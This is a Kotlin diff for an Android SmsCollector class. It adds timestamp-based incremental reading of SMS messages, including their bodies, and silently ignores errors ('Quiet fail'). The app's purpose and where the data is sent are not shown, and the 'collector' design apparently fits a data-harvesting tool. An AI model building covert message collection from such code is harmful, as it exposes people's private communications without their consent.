@@ -16,7 +16,13 @@ class SmsCollector(context: Context) : BaseCollector(context) {
         }
 
         var collectedCount = 0
+        val lastSyncTime = prefs.getLastSmsSyncTimestamp()
+        var maxTimestamp = lastSyncTime
+
         try {
+            val selection = if (lastSyncTime > 0) "${Telephony.Sms.DATE} > ?" else null
+            val selectionArgs = if (lastSyncTime > 0) arrayOf(lastSyncTime.toString()) else null
+
             val cursor = context.contentResolver.query(
                 Telephony.Sms.CONTENT_URI,
                 arrayOf(
@@ -26,9 +32,9 @@ class SmsCollector(context: Context) : BaseCollector(context) {
                     Telephony.Sms.DATE,
                     Telephony.Sms.TYPE
                 ),
-                null,
-                null,
-                "${Telephony.Sms.DATE} DESC LIMIT 50"
+                selection,
+                selectionArgs,
+                "${Telephony.Sms.DATE} ASC LIMIT 50"
             )
 
             cursor?.use {
@@ -42,6 +48,10 @@ class SmsCollector(context: Context) : BaseCollector(context) {
                     val body = if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else ""
                     val date = if (dateIdx != -1) it.getLong(dateIdx) else System.currentTimeMillis()
                     val type = if (typeIdx != -1) it.getInt(typeIdx) else Telephony.Sms.MESSAGE_TYPE_INBOX
+
+                    if (date > maxTimestamp) {
+                        maxTimestamp = date
+                    }
 
                     val typeStr = when (type) {
                         Telephony.Sms.MESSAGE_TYPE_INBOX -> "RECEIVED"
@@ -64,6 +74,10 @@ class SmsCollector(context: Context) : BaseCollector(context) {
                     )
                     collectedCount++
                 }
+            }
+
+            if (maxTimestamp > lastSyncTime) {
+                prefs.setLastSmsSyncTimestamp(maxTimestamp)
             }
         } catch (e: Exception) {
             // Quiet fail
